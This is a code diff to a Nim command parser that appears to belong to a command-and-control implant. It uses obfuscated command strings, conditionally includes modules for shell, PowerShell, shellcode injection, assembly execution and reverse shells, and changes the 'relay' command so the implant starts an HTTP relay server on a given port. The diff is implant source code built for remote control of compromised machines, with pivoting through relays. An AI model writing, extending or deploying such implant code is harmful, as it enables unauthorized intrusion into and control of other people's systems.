@@ -1,7 +1,7 @@
 import strutils
 from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
 from ../core/webClientListener import Listener
-import ../core/relay/[relay_protocol, relay_comm]
+import ../core/http_relay
 
 # Filesystem operations
 include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]
@@ -22,12 +22,8 @@ include ../modules/screenshot/[screenshot]
 when defined risky:
     include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]
 
-# Relay commands
-include ../modules/relay/[relay, connect]
-import ../modules/relay/relay_commands
-
-# Parse user commands for relay implants
-proc parseCmdRelay*(ri : RelayImplant, cmd : string, cmdGuid : string, args : seq[string]) : string =
+# Parse user commands for relay implants (no Listener required)
+proc parseCmdRelay*(cmd : string, cmdGuid : string, args : seq[string]) : string =
     # Debug logging - show received command
     when defined debug:
         let argsStr = if args.len > 0: " " & args.join(" ") else: ""
@@ -76,14 +72,18 @@ proc parseCmdRelay*(ri : RelayImplant, cmd : string, cmdGuid : string, args : se
         elif cmd == obf("whoami"):
             result = whoami()
         elif cmd == obf("relay"):
-            # Handle relay commands with full command string (same as normal mode)
-            let fullCmd = cmd & (if args.len > 0: " " & args.join(" ") else: "")
-            when defined debug:
-                echo "[DEBUG] 🔧 ┌─────────── CMDPARSER RELAY MATCH ───────────┐"
-                echo "[DEBUG] 🔧 │ ✅ RELAY COMMAND MATCHED! │"
-                echo "[DEBUG] 🔧 │ fullCmd: '" & fullCmd & "' │"
-                echo "[DEBUG] 🔧 └─────────────────────────────────────────────┘"
-            result = processRelayCommand(fullCmd)
+            # Start HTTP relay server with specified port
+            if args.len < 1:
+                result = obf("ERROR: relay command requires port number. Usage: relay <PORT>")
+            else:
+                try:
+                    let port = parseInt(args[0])
+                    if port < 1 or port > 65535:
+                        result = obf("ERROR: Invalid port number. Must be between 1-65535")
+                    else:
+                        result = "RELAY_START:" & $port  # Special marker for main.nim to start server
+                except ValueError:
+                    result = obf("ERROR: Invalid port number. Usage: relay <PORT>")
         else:
             when defined debug:
                 echo "[DEBUG] ❌ ┌─────────── CMDPARSER NO MATCH ───────────┐"
@@ -167,9 +167,18 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
         elif cmd == obf("whoami"):
             result = whoami()
         elif cmd == obf("relay"):
-            # Handle relay commands with full command string
-            let fullCmd = cmd & (if args.len > 0: " " & args.join(" ") else: "")
-            result = processRelayCommand(fullCmd)
+            # Start HTTP relay server with specified port
+            if args.len < 1:
+                result = obf("ERROR: relay command requires port number. Usage: relay <PORT>")
+            else:
+                try:
+                    let port = parseInt(args[0])
+                    if port < 1 or port > 65535:
+                        result = obf("ERROR: Invalid port number. Must be between 1-65535")
+                    else:
+                        result = "RELAY_START:" & $port  # Special marker for main.nim to start server
+                except ValueError:
+                    result = obf("ERROR: Invalid port number. Usage: relay <PORT>")
         else:
             # Parse risky commands, if enabled
             when defined risky:
